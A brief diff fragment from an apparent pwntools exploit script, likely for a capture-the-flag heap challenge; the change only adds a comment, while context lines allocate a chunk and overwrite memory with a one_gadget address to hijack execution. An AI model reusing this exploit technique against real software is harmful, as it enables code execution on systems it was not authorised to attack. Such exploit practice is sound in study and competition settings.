@@ -93,6 +93,8 @@ a = alloc(0x60)
 input("WAIT")
 write(a, b"A"*0x13 + p64(one_gadget))
 
+
+#this is a new allocation
 input("WAIT")
 r.sendline(b"1")
 input("WAIT")
